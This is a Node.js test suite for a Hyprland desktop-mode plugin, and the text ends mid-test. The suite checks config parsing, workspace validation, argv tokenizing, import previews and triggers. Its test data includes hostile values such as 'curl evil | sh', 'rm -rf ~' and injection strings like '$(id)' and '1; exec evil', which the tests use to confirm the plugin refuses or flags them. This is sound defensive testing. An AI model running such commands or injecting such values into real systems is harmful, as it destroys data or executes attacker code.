const test = require("node:test")
const assert = require("node:assert/strict")
const fs = require("node:fs")
const path = require("node:path")
const Model = require("../Model.js")

const root = path.join(__dirname, "..")
const read = (f) => fs.readFileSync(path.join(root, f), "utf8")
const qmlFiles = fs.readdirSync(root).filter((f) => f.endsWith(".qml"))

// Slicing between two function names only works if you happen to know which
// comes first in the file. Match braces instead.
function fnBody(src, signature) {
  const start = src.indexOf(signature)
  if (start === -1) return ""
  let depth = 0
  for (let i = src.indexOf("{", start); i < src.length; i++) {
    if (src[i] === "{") depth++
    else if (src[i] === "}" && --depth === 0) return src.slice(start, i + 1)
  }
  return ""
}

// ------------------------------------------------------------------ parsing

// qmllint reports a parse error as exit 255 with nothing on stderr, so the
// exit code is the only signal. Worth its own test: `final` is a reserved word
// the QML parser rejects outright, and nothing else here would have caught it.
test("every QML file parses", { skip: !hasQmllint() }, () => {
  const { spawnSync } = require("node:child_process")
  for (const file of qmlFiles) {
    const run = spawnSync("qmllint", [file], { cwd: root })
    assert.equal(run.status, 0,
      `${file} does not parse (qmllint exit ${run.status})\n${run.stderr}`)
  }
})

// qmllint does not catch this one, and the shell reports it as
// "Property value set multiple times" and refuses to load the plugin.
test("no QML object declares the same handler twice", () => {
  for (const file of qmlFiles) {
    const src = read(file)
    for (const handler of ["Component.onCompleted", "Component.onDestruction"]) {
      const count = src.split(handler).length - 1
      assert.ok(count <= 1, `${file} declares ${handler} ${count} times`)
    }
  }
})

function hasQmllint() {
  const { spawnSync } = require("node:child_process")
  return spawnSync("qmllint", ["--version"]).status === 0
}

// ------------------------------------------------------------------ storage

test("a missing config is a first run, not an error", () => {
  const result = Model.parseConfig("")
  assert.equal(result.firstRun, true)
  assert.equal(result.recovered, false)
  assert.deepEqual(result.config.modes, [])
  assert.equal(result.config.activeMode, null)
})

test("a corrupt config yields working defaults and is flagged for backup, never silently rewritten", () => {
  const result = Model.parseConfig("{ this is not json")
  assert.equal(result.recovered, true)
  assert.equal(result.config.modes.length, 0)
  assert.match(result.warnings[0], /not valid JSON/)
})

test("missing and unknown fields are tolerated; unknown ones do not survive", () => {
  const { config, warnings } = Model.normalizeConfig({
    version: 1,
    modes: [{ id: "coding", name: "Coding", futureField: "???" }]
  })
  assert.equal(warnings.length, 0)
  assert.equal(config.modes[0].futureField, undefined)
  assert.deepEqual(config.modes[0].commands, { onActivate: [], onDeactivate: [] })
  assert.equal(config.modes[0].notifications.dnd, null)
})

test("a newer schema version is read rather than discarded, with a warning", () => {
  const { config, warnings } = Model.normalizeConfig({
    version: 99,
    modes: [{ id: "coding", name: "Coding" }]
  })
  assert.equal(config.modes.length, 1)
  assert.match(warnings.join(" "), /version 99/)
})

test("an active mode that no longer exists is cleared", () => {
  const { config, warnings } = Model.normalizeConfig({
    version: 1,
    activeMode: "gone",
    modes: [{ id: "coding", name: "Coding" }]
  })
  assert.equal(config.activeMode, null)
  assert.match(warnings.join(" "), /no longer exists/)
})

test("duplicate ids in a file are disambiguated instead of colliding", () => {
  const { config } = Model.normalizeConfig({
    version: 1,
    modes: [{ id: "coding", name: "A" }, { id: "coding", name: "B" }]
  })
  assert.deepEqual(Model.modeIds(config), ["coding", "coding-2"])
})

test("serialize round-trips through normalize", () => {
  const { config } = Model.normalizeConfig({ version: 1, modes: [{ id: "coding", name: "Coding" }] })
  assert.deepEqual(JSON.parse(Model.serializeConfig(config)), config)
})

// ---------------------------------------------------------------- tri-state

test("dnd distinguishes unchanged from off", () => {
  assert.equal(Model.asTristate(undefined), null)
  assert.equal(Model.asTristate("nonsense"), null)
  assert.equal(Model.asTristate(false), false)
  assert.equal(Model.asTristate("on"), true)
})

test("a mode that leaves dnd unchanged produces no dnd step", () => {
  const ctx = Model.normalizeMode({ id: "a", name: "A" }, [])
  assert.equal(Model.activationPlan(ctx, {}).length, 0)
})

test("a mode that turns dnd off still produces a dnd step", () => {
  const ctx = Model.normalizeMode({ id: "a", name: "A", notifications: { dnd: false } }, [])
  const plan = Model.activationPlan(ctx, {})
  assert.equal(plan.length, 1)
  assert.equal(plan[0].kind, "dnd")
  assert.equal(plan[0].value, false)
})

// ----------------------------------------------------------------- ids

test("ids are stable across renames", () => {
  let { config } = Model.normalizeConfig({ version: 1, modes: [{ id: "coding", name: "Coding" }] })
  const updated = Model.updateMode(config, "coding", { name: "Development" })
  assert.equal(updated.error, "")
  assert.equal(updated.mode.id, "coding")
  assert.equal(updated.mode.name, "Development")
})

test("a display name becomes a machine-safe id", () => {
  assert.equal(Model.slugify("Deep Work!"), "deep-work")
  assert.equal(Model.slugify("   "), "")
  assert.equal(Model.uniqueId("", []), "mode")
  assert.equal(Model.uniqueId("coding", ["coding", "coding-2"]), "coding-3")
})

test("updating a mode that does not exist is an error, not a silent create", () => {
  const config = Model.defaultConfig()
  const result = Model.updateMode(config, "nope", { name: "X" })
  assert.equal(result.mode, null)
  assert.match(result.error, /No mode with id/)
})

test("deleting the active mode clears the active pointer", () => {
  let config = Model.createMode(Model.defaultConfig(), { name: "Coding" }).config
  config = Model.setActiveMode(config, "coding")
  const result = Model.deleteMode(config, "coding")
  assert.equal(result.removed, true)
  assert.equal(result.config.activeMode, null)
})

test("setting an active mode that does not exist is refused", () => {
  assert.equal(Model.setActiveMode(Model.defaultConfig(), "ghost").activeMode, null)
})

// ------------------------------------------------------------ activation

test("the activation plan is ordered environment first, focus last", () => {
  const ctx = Model.normalizeMode({
    id: "gaming", name: "Gaming",
    notifications: { dnd: true },
    audio: { output: "sink" },
    appearance: { wallpaper: "/w.png", theme: "Tokyo Night" },
    workspaces: { target: 3 },
    applications: [{ command: "steam" }],
    commands: { onActivate: ["notify-send hi"] }
  }, [])
  assert.deepEqual(Model.activationPlan(ctx, {}).map(s => s.kind),
    ["dnd", "audio", "wallpaper", "theme", "applications", "commands", "workspace"])
})

test("settings-only activation never launches apps or runs commands", () => {
  const ctx = Model.normalizeMode({
    id: "gaming", name: "Gaming",
    notifications: { dnd: true },
    applications: [{ command: "steam" }],
    commands: { onActivate: ["rm -rf /tmp/x"] }
  }, [])
  assert.deepEqual(Model.activationPlan(ctx, { settingsOnly: true }).map(s => s.kind), ["dnd"])
})

test("an application is either a desktop entry or a raw command, never both", () => {
  assert.deepEqual(Model.normalizeApplication("ghostty"),
    { uid: "", desktopId: "", command: "ghostty", args: "", directory: "", workspace: null, note: "", enabled: true })
  assert.deepEqual(Model.normalizeApplication({ desktopId: "org.foo.Bar" }),
    { uid: "", desktopId: "org.foo.Bar", command: "", args: "", directory: "", workspace: null, note: "", enabled: true })
  assert.deepEqual(Model.normalizeApplication({ desktopId: "a", command: "b" }),
    { uid: "", desktopId: "a", command: "", args: "", directory: "", workspace: null, note: "", enabled: true })
  // A uid is only carried, never invented, so a lone application is still the
  // same object it was; normalizeMode is what mints one.
  assert.equal(Model.normalizeApplication({ desktopId: "a", uid: "keep-me" }).uid, "keep-me")
  assert.equal(Model.normalizeApplication({ desktopId: "a", uid: "no spaces" }).uid, "")
  assert.equal(Model.normalizeApplication({}), null)
  assert.equal(Model.normalizeApplication({ command: "   " }), null)
})

test("applications can each name their own workspace", () => {
  assert.equal(Model.normalizeApplication({ command: "x", workspace: "2" }).workspace, 2)
  assert.equal(Model.normalizeApplication({ command: "x", workspace: "project" }).workspace, "project")
  assert.equal(Model.normalizeApplication({ command: "x", workspace: "" }).workspace, null)
  assert.equal(Model.normalizeApplication({ command: "x" }).workspace, null)
})

test("a mode can lay out several workspaces at once", () => {
  const ctx = Model.normalizeMode({
    id: "coding", name: "Coding",
    workspaces: { target: 1 },
    applications: [
      { desktopId: "term", workspace: 1 },
      { desktopId: "browser", workspace: 2 },
      { command: "slack" }
    ]
  }, [])
  const apps = Model.activationPlan(ctx, {}).filter(s => s.kind === "applications")
  assert.deepEqual(apps.map(s => s.workspace), [1, 2, null])
  assert.match(apps[1].label, /on workspace 2/)
})

test("placement rides as a Hyprland exec rule, and only when asked for", () => {
  assert.equal(Model.hyprlandExecRule(3, "alacritty"), "[workspace 3 silent] alacritty")
  assert.equal(Model.hyprlandExecRule("code", "x"), "[workspace code silent] x")
  assert.equal(Model.hyprlandExecRule(null, "alacritty"), "alacritty")
  assert.equal(Model.hyprlandExecRule(undefined, "alacritty"), "alacritty")
})

test("a workspace outside Hyprland's grammar is refused, not patched up", () => {
  assert.ok(Model.isWorkspaceRef(3))
  assert.ok(Model.isWorkspaceRef("+1"))
  assert.ok(Model.isWorkspaceRef("e+1"))
  assert.ok(Model.isWorkspaceRef("m-1"))
  assert.ok(Model.isWorkspaceRef("previous"))
  assert.ok(Model.isWorkspaceRef("special:magic"))
  assert.ok(Model.isWorkspaceRef("name:Deep Work"))
  assert.ok(Model.isWorkspaceRef("project"))

  assert.equal(Model.isWorkspaceRef('1] evil [x'), false)
  assert.equal(Model.isWorkspaceRef("1,address:0xdead"), false)
  assert.equal(Model.isWorkspaceRef('a"b\nc'), false)
  assert.equal(Model.isWorkspaceRef("1; exec evil"), false)
  assert.equal(Model.isWorkspaceRef("$(id)"), false)
  assert.equal(Model.isWorkspaceRef("x".repeat(64)), false)
  assert.equal(Model.isWorkspaceRef(""), false)

  assert.equal(Model.workspaceRef("2"), "2")
  assert.equal(Model.workspaceRef('1] evil [x'), "")
})

test("a workspace that cannot be dispatched never reaches a dispatch string", () => {
  assert.equal(Model.hyprlandExecRule('1] evil [x', "app"), "app")
  assert.equal(Model.hyprlandExecRule("1,address:0xdead", "app"), "app")
  assert.equal(Model.asWorkspace('1] evil [x'), null)
  assert.equal(Model.asWorkspace("special:magic"), "special:magic")
  assert.equal(Model.normalizeApplication({ command: "x", workspace: "1;evil" }).workspace, null)
})

test("a command cannot break out of the Lua string it is dispatched in", () => {
  assert.equal(Model.luaQuote('a"b'), '"a\\"b"')
  assert.equal(Model.luaQuote("a\\b"), '"a\\\\b"')
})

test("a desktop id written the way it is spelled on disk still resolves", () => {
  assert.equal(Model.normalizeApplication({ desktopId: "org.foo.Bar.desktop" }).desktopId, "org.foo.Bar")
})

test("a desktop-entry application produces a step the executor can route", () => {
  const ctx = Model.normalizeMode({
    id: "a", name: "A",
    applications: [{ desktopId: "org.foo.Bar" }, { command: "chromium --new-window" }]
  }, [])
  const steps = Model.activationPlan(ctx, {})
  assert.deepEqual(steps.map(s => s.desktopId), ["org.foo.Bar", ""])
  assert.deepEqual(steps.map(s => s.value), ["", "chromium --new-window"])
  assert.match(steps[0].label, /org\.foo\.Bar/)
})

test("an application always has something to call it, entry or command", () => {
  assert.equal(Model.applicationLabel({ desktopId: "org.foo.Bar", command: "" }), "org.foo.Bar")
  assert.equal(Model.applicationLabel({ desktopId: "", command: "ghostty -e top" }), "ghostty -e top")
  assert.equal(Model.applicationLabel(null), "")
})

test("disabled applications and the global launchApps switch are both honoured", () => {
  const ctx = Model.normalizeMode({
    id: "a", name: "A",
    applications: [{ command: "steam", enabled: false }, { command: "discord" }]
  }, [])
  assert.deepEqual(Model.activationPlan(ctx, {}).map(s => s.value), ["discord"])
  assert.deepEqual(Model.activationPlan(ctx, {}).map(s => s.desktopId), [""])
  assert.deepEqual(Model.activationPlan(ctx, {}).map(s => s.workspace), [null])
  assert.deepEqual(Model.activationPlan(ctx, { launchApps: false }), [])
})

test("a summary counts warnings rather than listing every action", () => {
  const summary = Model.summarize("Gaming", [{ ok: true }, { ok: false }, { ok: false }])
  assert.equal(summary.warnings, 2)
  assert.match(summary.body, /2 warnings/)
  assert.equal(Model.summarize("Coding", [{ ok: true }]).body, "")
})

// ------------------------------------------------------------- restoring

test("only values this plugin set are restored", () => {
  const snapshot = { dnd: false, appliedDnd: true, wallpaper: "/old.png", appliedWallpaper: "/new.png" }
  const steps = Model.restorePlan(snapshot, { dnd: true, wallpaper: "/new.png" })
  assert.deepEqual(steps.map(s => s.kind), ["dnd", "wallpaper"])
})

test("a value the user changed by hand since is left alone", () => {
  const snapshot = { dnd: false, appliedDnd: true }
  assert.deepEqual(Model.restorePlan(snapshot, { dnd: false }), [])
})

test("an empty snapshot restores nothing", () => {
  assert.deepEqual(Model.restorePlan({}, {}), [])
  assert.deepEqual(Model.restorePlan(null, {}), [])
})

// ------------------------------------------------------------------ argv

test("application commands tokenize like a shell, without being one", () => {
  assert.deepEqual(Model.parseArgv("ghostty").argv, ["ghostty"])
  assert.deepEqual(Model.parseArgv("chromium --app='https://a b'").argv, ["chromium", "--app=https://a b"])
  assert.deepEqual(Model.parseArgv("a  b\tc").argv, ["a", "b", "c"])
})

test("shell metacharacters in an application command stay literal data", () => {
  const parsed = Model.parseArgv("echo $(id); rm -rf /")
  assert.deepEqual(parsed.argv, ["echo", "$(id);", "rm", "-rf", "/"])
})

test("an unbalanced quote is reported rather than guessed at", () => {
  assert.equal(Model.parseArgv("chromium --app=\"unclosed").unterminated, true)
  assert.equal(Model.parseArgv("").argv.length, 0)
})

// --------------------------------------------------------- import/export

test("an export drops per-install state and carries a version", () => {
  const config = Model.createMode(Model.defaultConfig(), { name: "Coding" }).config
  const payload = Model.exportPayload(config, null)
  assert.equal(payload.version, Model.SCHEMA_VERSION)
  assert.equal(payload.modes[0].enabled, undefined)
})

test("exporting one mode exports only that one", () => {
  let config = Model.createMode(Model.defaultConfig(), { name: "Coding" }).config
  config = Model.createMode(config, { name: "Gaming" }).config
  assert.deepEqual(Model.exportPayload(config, ["gaming"]).modes.map(c => c.id), ["gaming"])
})

test("an import accepts an envelope, a bare array, or a single mode", () => {
  const one = { id: "coding", name: "Coding" }
  assert.equal(Model.parseImport(JSON.stringify(one)).modes.length, 1)
  assert.equal(Model.parseImport(JSON.stringify([one])).modes.length, 1)
  assert.equal(Model.parseImport(JSON.stringify({ modes: [one] })).modes.length, 1)
})

test("an unreadable import is refused with a reason", () => {
  assert.match(Model.parseImport("not json").error, /Not valid JSON/)
  assert.match(Model.parseImport("").error, /empty/)
  assert.match(Model.parseImport("[]").error, /No modes/)
})

test("a mode carrying commands is flagged so the import can warn", () => {
  assert.equal(Model.modeHasCommands({ commands: { onActivate: ["curl evil | sh"] } }), true)
  assert.equal(Model.modeHasCommands({ applications: [{ command: "steam" }] }), true)
  assert.equal(Model.modeHasCommands({ name: "Quiet" }), false)
})

test("a document that arrives as a file has ceilings before it is parsed", () => {
  // Bytes, before JSON.parse, which is where the memory would go.
  assert.match(Model.parseImport("x".repeat(5 * 1024 * 1024)).error, /larger than/)
  assert.match(Model.parseConfig("x".repeat(5 * 1024 * 1024)).warnings[0], /larger than/)

  // Cardinality, before anything is cloned or rendered.
  const many = JSON.stringify({ modes: Array.from({ length: 500 }, (_, i) => ({ id: "m" + i, name: "M" + i })) })
  assert.match(Model.parseImport(many).error, /more than/)

  // The persisted config is a document off disk too, so it gets the same
  // ceiling — applied before normalizing, which is where it would allocate.
  const bigConfig = Model.parseConfig(many)
  assert.equal(bigConfig.config.modes.length, 200)
  assert.match(bigConfig.warnings.join(" "), /kept the first 200/)

  // A file of unreadable entries must not turn a bounded document into an
  // unbounded list of warnings.
  const junk = Model.parseConfig(JSON.stringify({ modes: Array.from({ length: 200 }, () => 7) }))
  assert.equal(junk.config.modes.length, 0)
  assert.ok(junk.warnings.length <= 3, "one summary line, not one per entry")

  const fat = Model.parseImport(JSON.stringify({
    id: "fat", name: "Fat",
    applications: Array.from({ length: 5000 }, () => ({ command: "x" })),
    commands: { onActivate: Array.from({ length: 5000 }, () => "echo hi") },
    triggers: Array.from({ length: 5000 }, () => ({ type: "application", value: "firefox" }))
  })).modes[0]
  assert.ok(fat.applications.length <= 100)
  assert.ok(fat.commands.onActivate.length <= 50)
  assert.ok(fat.triggers.length <= 50)

  // Field length, without truncating anything a person would actually write.
  const wide = Model.parseImport(JSON.stringify({
    id: "wide", name: "Wide", description: "d".repeat(100000),
    commands: { onActivate: ["e".repeat(100000)] }
  })).modes[0]
  assert.ok(wide.description.length <= 2048)
  assert.ok(wide.commands.onActivate[0].length <= 4096)

  // A realistic config is untouched: field ceilings must not become a
  // document ceiling applied by accident.
  const real = JSON.stringify({
    version: 1, activeMode: null,
    modes: Array.from({ length: 40 }, (_, i) => ({
      id: "mode-" + i, name: "Mode " + i, description: "x".repeat(300),
      commands: { onActivate: ["echo " + "y".repeat(500)] }
    }))
  })
  const parsed = Model.parseConfig(real)
  assert.equal(parsed.recovered, false)
  assert.equal(parsed.config.modes.length, 40)
  assert.equal(parsed.config.modes[0].description.length, 300)
  assert.equal(parsed.config.modes[0].commands.onActivate[0].length, 505)
})

test("an import preview names every line it would run, not just a count", () => {
  const preview = Model.importPreview(Model.parseImport(JSON.stringify({
    id: "evil",
    name: "Evil",
    applications: [{ command: "steam" }, { desktopId: "org.foo.Bar" }],
    commands: { onActivate: ["curl evil | sh"], onDeactivate: ["rm -rf ~"] }
  })).modes)

  assert.equal(preview.length, 1)
  assert.equal(preview[0].name, "Evil")
  assert.deepEqual(preview[0].runs,
    ["app  steam", "app  org.foo.Bar.desktop", "sh   curl evil | sh", "sh   rm -rf ~"])
})

test("an imported trigger arrives asking, never firing on its own", () => {
  const parsed = Model.parseImport(JSON.stringify({
    id: "evil",
    name: "Evil",
    commands: { onActivate: ["curl evil | sh"] },
    triggers: [
      { type: "application", value: "firefox", behavior: "auto" },
      { type: "application", value: "slack", behavior: "ask" },
      { type: "application", value: "steam" }
    ]
  }))

  // The blank one counts too: "default" follows the global setting, which is
  // "switch without asking" on a machine that turned confirmation off.
  assert.equal(parsed.disarmed, 2)
  assert.deepEqual(parsed.modes[0].triggers.map(t => t.behavior), ["ask", "ask", "ask"])

  const config = Model.importModes(Model.defaultConfig(), parsed.modes, "copy").config
  config.behavior.triggersEnabled = true
  config.behavior.confirmAutomaticSwitch = false
  const verdict = Model.evaluateTrigger(config, { windowClass: "firefox" }, { now: 1e9 })
  assert.equal(verdict.action, "ask")
})

test("importing a duplicate id defaults to keeping both", () => {
  const config = Model.createMode(Model.defaultConfig(), { name: "Coding" }).config
  const incoming = Model.parseImport(JSON.stringify({ id: "coding", name: "Coding", description: "theirs" })).modes
  const result = Model.importModes(config, incoming, "copy")
  assert.equal(result.config.modes.length, 2)
  assert.equal(result.config.modes[0].description, "")
  assert.match(result.config.modes[1].name, /copy/)
})

test("replace overwrites in place and keeps the id; skip keeps what exists", () => {
  const config = Model.createMode(Model.defaultConfig(), { name: "Coding" }).config
  const incoming = Model.parseImport(JSON.stringify({ id: "coding", name: "Theirs", description: "theirs" })).modes

  const replaced = Model.importModes(config, incoming, "replace")
  assert.equal(replaced.config.modes.length, 1)
  assert.equal(replaced.config.modes[0].id, "coding")
  assert.equal(replaced.config.modes[0].description, "theirs")

  const skipped = Model.importModes(config, incoming, "skip")
  assert.equal(skipped.config.modes.length, 1)
  assert.equal(skipped.config.modes[0].description, "")
  assert.deepEqual(skipped.skipped, ["coding"])
})

// ---------------------------------------------------------------- triggers

const triggerConfig = (overrides) => {
  const config = Model.normalizeConfig({
    version: 1,
    modes: [{
      id: "gaming", name: "Gaming",
      triggers: [{ type: "application", value: "steam", enabled: true, behavior: "ask" }]
    }]
  }).config
  config.behavior.triggersEnabled = true
  return Object.assign(config, overrides || {})
}

const openWindow = (cls) => Model.parseOpenWindowEvent("0x1,3," + cls + ",A title, with commas")

test("an openwindow event keeps a comma in the title intact", () => {
  const event = openWindow("steam")
  assert.equal(event.windowClass, "steam")
  assert.equal(event.title, "A title, with commas")
  assert.equal(Model.parseOpenWindowEvent("garbage"), null)
})

test("triggers are inert until switched on globally", () => {
  const config = triggerConfig()
  config.behavior.triggersEnabled = false
  assert.equal(Model.evaluateTrigger(config, openWindow("steam"), { now: 0 }).action, "ignore")
})

test("a matching window asks before switching", () => {
  const decision = Model.evaluateTrigger(triggerConfig(), openWindow("steam"), { now: 100000 })
  assert.equal(decision.action, "ask")
  assert.equal(decision.modeId, "gaming")
})

test("a class matches as a substring so steam_app_12345 still counts", () => {
  assert.equal(Model.evaluateTrigger(triggerConfig(), openWindow("steam_app_12345"), { now: 100000 }).action, "ask")
  assert.equal(Model.evaluateTrigger(triggerConfig(), openWindow("ghostty"), { now: 100000 }).action, "ignore")
})

test("a per-trigger behavior of auto overrides the global ask default", () => {
  const config = triggerConfig()
  config.modes[0].triggers[0].behavior = "auto"
  assert.equal(Model.evaluateTrigger(config, openWindow("steam"), { now: 100000 }).action, "switch")
})

test("an unset per-trigger behavior follows the global setting", () => {
  const config = triggerConfig()
  config.modes[0].triggers[0].behavior = ""
  config.behavior.confirmAutomaticSwitch = false
  assert.equal(Model.evaluateTrigger(config, openWindow("steam"), { now: 100000 }).action, "switch")
})

test("the mode that is already active never re-triggers itself", () => {
  const config = triggerConfig()
  config.activeMode = "gaming"
  assert.equal(Model.evaluateTrigger(config, openWindow("steam"), { now: 100000 }).action, "ignore")
})

test("a window opened by our own activation cannot start a switching loop", () => {
  const config = triggerConfig()
  const decision = Model.evaluateTrigger(config, openWindow("steam"), {
    now: 1000,
    lastActivationAt: 1000 - (Model.TRIGGER_COOLDOWN_MS - 1)
  })
  assert.equal(decision.action, "ignore")
  assert.match(decision.reason, /cooldown/)
})

test("the cooldown expires so a later launch does trigger", () => {
  const config = triggerConfig()
  const decision = Model.evaluateTrigger(config, openWindow("steam"), {
    now: 1000000,
    lastActivationAt: 1000000 - (Model.TRIGGER_COOLDOWN_MS + 1)
  })
  assert.equal(decision.action, "ask")
})

test("a disabled trigger and a disabled mode are both inert", () => {
  const disabledTrigger = triggerConfig()
  disabledTrigger.modes[0].triggers[0].enabled = false
  assert.equal(Model.evaluateTrigger(disabledTrigger, openWindow("steam"), { now: 1e6 }).action, "ignore")

  const disabledMode = triggerConfig()
  disabledMode.modes[0].enabled = false
  assert.equal(Model.evaluateTrigger(disabledMode, openWindow("steam"), { now: 1e6 }).action, "ignore")
})

test("reordering is clamped and leaves the list alone at the edges", () => {
  assert.deepEqual(Model.moveInList([1, 2, 3], 0, 1), [2, 1, 3])
  assert.deepEqual(Model.moveInList([1, 2, 3], 2, -1), [1, 3, 2])
  assert.deepEqual(Model.moveInList([1, 2, 3], 0, -1), [1, 2, 3])
  assert.deepEqual(Model.moveInList([1, 2, 3], 2, 1), [1, 2, 3])
  assert.deepEqual(Model.moveInList([1, 2, 3], 9, 1), [1, 2, 3])
  assert.deepEqual(Model.moveInList(null, 0, 1), [])
})

test("modes reorder by id, and report whether anything moved", () => {
  let config = Model.createMode(Model.defaultConfig(), { name: "A" }).config
  config = Model.createMode(config, { name: "B" }).config
  const down = Model.moveMode(config, "a", 1)
  assert.deepEqual(Model.modeIds(down.config), ["b", "a"])
  assert.equal(down.moved, true)
  assert.equal(Model.moveMode(config, "a", -1).moved, false)
  assert.equal(Model.moveMode(config, "ghost", 1).moved, false)
})

test("a capture note is display text and never affects the launch", () => {
  const app = Model.normalizeApplication({ desktopId: "firefox", note: "YouTube" })
  assert.equal(app.note, "YouTube")
  const plan = Model.activationPlan(
    Model.normalizeMode({ id: "a", name: "A", applications: [app] }, []), {})
  assert.equal(plan[0].desktopId, "firefox")
  assert.equal(plan[0].value, "")
  assert.equal(plan[0].note, undefined)
})

test("a window title rides through capture as the note", () => {
  const captured = Model.captureMode({
    windows: [
      { desktopId: "firefox", workspace: 1, title: "GitHub" },
      { desktopId: "firefox", workspace: 2, title: "YouTube" }
    ]
  })
  assert.deepEqual(captured.applications.map(a => a.note), ["GitHub", "YouTube"])
})

// ----------------------------------------------------------------- capture

test("a capture becomes a mode, sorted by workspace", () => {
  const captured = Model.captureMode({
    name: "Now",
    workspace: 2,
    dnd: false,
    audioOutput: "headset",
    wallpaper: "/w.png",
    theme: "Tokyo Night",
    windows: [
      { desktopId: "firefox", workspace: 2 },
      { desktopId: "term", workspace: 1 },
      { command: "oddball", workspace: null }
    ]
  })
  assert.equal(captured.name, "Now")
  assert.equal(captured.workspaces.target, 2)
  assert.equal(captured.notifications.dnd, false)
  assert.equal(captured.audio.output, "headset")
  assert.equal(captured.appearance.theme, "Tokyo Night")
  assert.deepEqual(captured.applications.map(a => a.workspace), [1, 2, null])
})

test("two windows of the same app on one workspace capture as one entry", () => {
  const captured = Model.captureMode({
    windows: [
      { desktopId: "term", workspace: 1 },
      { desktopId: "term", workspace: 1 },
      { desktopId: "term", workspace: 2 }
    ]
  })
  assert.deepEqual(captured.applications.map(a => a.workspace), [1, 2])
})

test("a folder is stored the way you would type it, and expanded once", () => {
  assert.equal(Model.collapseHome("/home/me/Projects", "/home/me"), "~/Projects")
  assert.equal(Model.collapseHome("/home/me", "/home/me"), "~")
  assert.equal(Model.collapseHome("/etc/nginx", "/home/me"), "/etc/nginx")
  // Not a prefix match on the string: /home/melissa is not inside /home/me.
  assert.equal(Model.collapseHome("/home/melissa/x", "/home/me"), "/home/melissa/x")

  assert.equal(Model.expandHome("~/Projects", "/home/me"), "/home/me/Projects")
  assert.equal(Model.expandHome("~", "/home/me"), "/home/me")
  assert.equal(Model.expandHome("/etc/nginx", "/home/me"), "/etc/nginx")
  // A leading ~ that is not a path segment is a folder called "~something".
  assert.equal(Model.expandHome("~weird", "/home/me"), "~weird")
  assert.equal(Model.expandHome(Model.collapseHome("/home/me/a/b", "/home/me"), "/home/me"),
    "/home/me/a/b")
})

test("an application carries what to run it with and where to run it", () => {
  const app = Model.normalizeApplication({
    desktopId: "foot", args: "-e btop", directory: "~/Projects/"
  })
  assert.equal(app.args, "-e btop")
  // A trailing slash is not part of the folder's identity.
  assert.equal(app.directory, "~/Projects")

  // Both end up in a shell command line, so neither gets to carry a newline.
  const sneaky = Model.normalizeApplication({
    command: "foot", args: "-e btop\nrm -rf ~", directory: "~/a\nb"
  })
  assert.equal(sneaky.args.indexOf("\n"), -1)
  assert.equal(sneaky.directory.indexOf("\n"), -1)

  // And neither is unbounded.
  const long = Model.normalizeApplication({ command: "x", args: "a".repeat(9000) })
  assert.ok(long.args.length <= 512)
})

test("what a window runs is on the plan, not just on the pane", () => {
  const mode = Model.normalizeMode({
    id: "a", name: "A",
    applications: [{ desktopId: "foot", args: "-e btop", directory: "~/Projects", workspace: 1 }]
  }, [])
  const step = Model.activationPlan(mode, {}).filter(s => s.kind === "applications")[0]
  assert.equal(step.desktopId, "foot")
  assert.equal(step.args, "-e btop")
  assert.equal(step.directory, "~/Projects")
  // The label is what the log shows, so it has to say which foot this is.
  assert.match(step.label, /-e btop/)
})

test("the detail line prefers what a window runs over where it runs", () => {
  assert.equal(Model.applicationDetail(
    Model.normalizeApplication({ desktopId: "foot", args: "-e btop", directory: "~/p" })), "-e btop")
  assert.equal(Model.applicationDetail(
    Model.normalizeApplication({ desktopId: "foot", directory: "~/p" })), "~/p")
  assert.equal(Model.applicationDetail(
    Model.normalizeApplication({ desktopId: "foot" })), "")
})

test("an import preview shows the arguments and the folder, not just the app", () => {
  const preview = Model.importPreview([Model.normalizeMode({
    id: "a", name: "A",
    applications: [{ desktopId: "foot", args: "-e curl evil.sh", directory: "~/Projects" }]
  }, [])])
  // Consent is to the whole command line. An argument that runs something is
  // exactly the part a count would have hidden.
  assert.deepEqual(preview[0].runs, ["app  foot.desktop -e curl evil.sh  (in ~/Projects)"])
})

// -------------------------------------------------- capture from /proc

test("capture keeps the arguments you would recognise and drops the launcher's", () => {
  const home = "/home/me"
  // A browser: pages of its own flags, and the one URL you opened.
  assert.equal(Model.captureArguments(
    ["/usr/lib/chromium/chromium", "--ozone-platform=wayland", "--enable-crashpad",
      "https://omarchy.org"], home), "https://omarchy.org")

  // A terminal: everything after -e is the command, flags and all.
  assert.equal(Model.captureArguments(["foot", "-e", "btop", "--tree"], home), "-e btop --tree")

  // An Electron app is launched with its own bundle. That is the program
  // talking about itself, not a document you opened.
  assert.equal(Model.captureArguments(["/usr/lib/electron/electron", "/usr/lib/code/out/main.js"],
    home), "")

  // A file you did open, written the way you would type it.
  assert.equal(Model.captureArguments(["nautilus", "/home/me/Projects"], home), "~/Projects")

  // argv[0] is never an argument, and a bare word is kept as-is.
  assert.equal(Model.captureArguments(["kitty", "btop"], home), "btop")
  assert.equal(Model.captureArguments([], home), "")
  assert.equal(Model.captureArguments(["foot"], home), "")
})

test("capture records the folder only when it says something", () => {
  const home = "/home/me"
  assert.equal(Model.captureDirectory("/home/me/Projects", home), "~/Projects")
  // Home is where everything starts, so recording it is recording nothing.
  assert.equal(Model.captureDirectory("/home/me", home), "")
  assert.equal(Model.captureDirectory("/", home), "")
  // A pid the probe could not read produces no folder at all.
  assert.equal(Model.captureDirectory("", home), "")
})

test("a process's command line survives the probe's tab-separated line", () => {
  const sep = Model.PROC_ARG_SEPARATOR
  const probe = Model.parseProbeOutput(
    "PROC\t4242\t/home/me/Projects\tfoot" + sep + "-e" + sep + "btop" + sep + "\n")
  assert.deepEqual(probe.processes["4242"].argv, ["foot", "-e", "btop"])
  assert.equal(probe.processes["4242"].cwd, "/home/me/Projects")

  // An argument is allowed to contain a space, which is why the join is not one.
  const spaced = Model.parseProbeOutput("PROC\t7\t/tmp\tcode" + sep + "/home/me/My Notes\n")
  assert.deepEqual(spaced.processes["7"].argv, ["code", "/home/me/My Notes"])

  // Same closed-record rule as `missing`: a pid cannot be "constructor".
  assert.equal(Object.getPrototypeOf(probe.processes), null)
  assert.equal(Model.parseProbeOutput("PROC\tconstructor\t/\tx\n").processes.constructor,
    undefined)
})

test("two terminals running different things capture as two entries", () => {
  const captured = Model.captureMode({
    windows: [
      { desktopId: "foot", workspace: 1, args: "-e btop" },
      { desktopId: "foot", workspace: 1, directory: "~/Projects" },
      // Same app, same workspace, same command: still one entry.
      { desktopId: "foot", workspace: 1, args: "-e btop" }
    ]
  })
  assert.equal(captured.applications.length, 2)
  assert.deepEqual(captured.applications.map(a => a.args), ["-e btop", ""])
  assert.deepEqual(captured.applications.map(a => a.directory), ["", "~/Projects"])
})

test("an empty desktop captures as an empty, still-valid mode", () => {
